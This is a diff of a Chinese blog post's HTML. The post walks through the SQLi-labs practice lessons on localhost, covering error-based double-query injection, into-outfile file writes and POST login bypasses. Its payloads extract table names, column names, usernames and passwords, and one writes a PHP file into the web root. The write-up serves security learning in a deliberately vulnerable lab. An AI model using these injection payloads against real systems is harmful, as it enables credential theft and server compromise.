@@ -169,7 +169,7 @@
       <span class="post-info-item"><i class="iconfont iconcalendar"></i>November 09, 2020</span
         class="post-info-item">
       
-      <span class="post-info-item"><i class="iconfont iconfont-size"></i>5085</span>
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>6889</span>
     </div>
   </div>
 </section>
@@ -255,7 +255,8 @@
 </li>
 </ol>
 <p><img   class="lazyload" data-original="/2020/11/09/sqlilabs/14.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
-<h2 id="GET-基于双注入的SQL注入发现"><a href="#GET-基于双注入的SQL注入发现" class="headerlink" title="GET 基于双注入的SQL注入发现"></a>GET 基于双注入的SQL注入发现</h2><p>在做题之前，先来了解几个概念：</p>
+<h2 id="GET-基于双注入的SQL注入发现"><a href="#GET-基于双注入的SQL注入发现" class="headerlink" title="GET 基于双注入的SQL注入发现"></a>GET 基于双注入的SQL注入发现</h2><p><strong>有报错，但是没有回显位</strong></p>
+<p>在做题之前，先来了解几个概念：</p>
 <p><strong>SQL中常见的聚合函数：</strong></p>
 <ol>
 <li><p><code>count()</code>：记录个数/项目数/记录数等</p>
@@ -293,7 +294,7 @@
 <ol start="2">
 <li>查询表名</li>
 </ol>
-<p><code>http://localhost/sqli-labs-master/Less-5/?id=1&#39; union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1),floor(rand()*2))as a from information_schema.tables group by a --+</code>0</p>
+<p><code>http://localhost/sqli-labs-master/Less-5/?id=1&#39; union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1),floor(rand()*2))as a from information_schema.tables group by a --+</code></p>
 <p><img   class="lazyload" data-original="/2020/11/09/sqlilabs/18.JPG" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
 <p>这里只能返回一列，因此通过改变<code>Limit 0,1</code>来遍历</p>
 <p><code>limit</code>用法：</p>
@@ -336,10 +337,12 @@
 <p><img   class="lazyload" data-original="/2020/11/09/sqlilabs/23.JPG" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
 </li>
 <li><p>题目提示使用outfile，结合union select 使用，查看数据库名，虽然报错但是仍然生成了一个ttttest.php文件，打开正是数据库名：<code>http://localhost/sqli-labs-master/Less-7/?id=0&#39;)) union select 1,2,database() into outfile &quot;D:\\phpStudy\\PHPTutorial\\WWW\\ttttest.php&quot; --+</code></p>
+<p><em>不知道为什么路径要用”\\“，否则就不能生成文件</em></p>
 <p><img   class="lazyload" data-original="/2020/11/09/sqlilabs/24.JPG" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
 <p><img   class="lazyload" data-original="/2020/11/09/sqlilabs/25.JPG" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
 </li>
 <li><p>查看表名：<code>http://localhost/sqli-labs-master/Less-7/?id=0&#39;)) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() into outfile &quot;D:\\phpStudy\\PHPTutorial\\WWW\\ttttest.php&quot; --+</code></p>
+<p><em>注：生成的文件不能覆盖，所以要删除原来的文件再执行</em></p>
 <p><img   class="lazyload" data-original="/2020/11/09/sqlilabs/26.JPG" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
 </li>
 <li><p>查看列名：<code>http://localhost/sqli-labs-master/Less-7/?id=0&#39;)) union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() into outfile &quot;D:\\phpStudy\\PHPTutorial\\WWW\\ttttest.php&quot; --+</code></p>
@@ -349,7 +352,51 @@
 <p><img   class="lazyload" data-original="/2020/11/09/sqlilabs/28.JPG" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
 </li>
 </ol>
-
+<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p><strong>不报错，但是输入出错就不显示<code>Please input the ID as parameter with numeric value </code>这句话，可以利用这一点进行盲注</strong></p>
+<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><h4 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h4><p>参考了一点网上的资料写了一个脚本</p>
+<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><h4 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h4><h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h2><h4 id="less11"><a href="#less11" class="headerlink" title="less11"></a>less11</h4><p>这个特别简单，利用<code>1=1</code>永远成立即可</p>
+<p>原理与Less-1相同，先利用单引号闭合sql语句，再利用or 1=1语句，让句子永远成立，最后注释后面的语句即可</p>
+<p><em>注意：– 后面是有空格的！</em></p>
+<p><img   class="lazyload" data-original="/2020/11/09/sqlilabs/30.JPG" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p><img   class="lazyload" data-original="/2020/11/09/sqlilabs/31.JPG" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<h4 id="less-12"><a href="#less-12" class="headerlink" title="less-12"></a>less-12</h4><p>题目首先提示了，是双引号报错</p>
+<p>那么在username中输入双引号，结果报错：<code>&quot;1&quot;&quot;) and password=(&quot;&quot;) LIMIT 0,1</code>，说明要使用<code>&quot;)</code>闭合</p>
+<p><img   class="lazyload" data-original="/2020/11/09/sqlilabs/32.JPG" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>成功√</p>
+<h4 id="less-13"><a href="#less-13" class="headerlink" title="less-13"></a>less-13</h4><p>题目提示是双注入，我们可以联想到less-5，利用聚合函数和随机数进行报错</p>
+<ol>
+<li><p>找到注入点，输入<code>1&#39;</code>测试，发现返回：<code>&#39;1&#39;&#39;) and password=(&#39;&#39;) LIMIT 0,1</code>，于是我们知道是用<code>&#39;)</code>闭合</p>
+</li>
+<li><p>查询列数：</p>
+<p>`1’) order by 1 – ``</p>
+<p> ``1’) order by 2 – `</p>
+<p>1’) order by 3 – `报错，所以可以确定列数是2（一开始想当然以为是3，所以没有做出来，以后还是要细心谨慎呀）</p>
+</li>
+<li><p>利用聚合函数查询数据库：</p>
+<p><code>1&#39;) union select count(*),concat((select database()),floor(rand()*2))as a from information_schema.tables group by a #</code></p>
+</li>
+</ol>
+<p><em>注：之前get方法用的注释是<code>--+</code>，实际上是<code>-- </code>（后面有空格），之所以用加号是因为url会进行编码，加号编码后就是空格，而空格编码是%20，但POST方法不是在url中输入，因此使用<code>#</code>或者<code>-- </code>，为了看得更清楚，接下来都用<code>#</code></em></p>
+<p><img   class="lazyload" data-original="/2020/11/09/sqlilabs/33.JPG" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<ol start="4">
+<li><p>查询表名：</p>
+<p><code>1&#39;) union select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 1,1),floor(rand()*2))as a from information_schema.tables group by a #</code></p>
+</li>
+</ol>
+<p><em>这里和less-5一样更改limit后面的第一个参数就可以得到全部的表名，就不一一列举了</em></p>
+<ol start="5">
+<li><p>查询列名：</p>
+<p><code>1&#39;) union select count(*),concat((select column_name from information_schema.columns where table_schema=database() limit 1,1),floor(rand()*2))as a from information_schema.tables group by a #</code></p>
+</li>
+<li><p>查询用户名和密码：</p>
+<p><code>1&#39;) union select count(*) ,concat((select username from users limit 0,1),floor(rand()*2))as a from information_schema.tables group by a#</code></p>
+<p><code>1&#39;) union select count(*) ,concat((select password from users limit 0,1),floor(rand()*2))as a from information_schema.tables group by a#</code></p>
+</li>
+</ol>
+<h4 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h4><p>与less-13相同，就是闭合方式不同：使用双引号测试，报错：</p>
+<p><code>&quot;1&quot;&quot; and password=&quot;&quot; LIMIT 0,1</code></p>
+<p>所以只要将less-13的闭合改为双引号，其他都一样，即可完成注入，这里就不再赘述。</p>
+<h4 id="less-15"><a href="#less-15" class="headerlink" title="less-15"></a>less-15</h4>
       </section>
       <section class="extra">
         
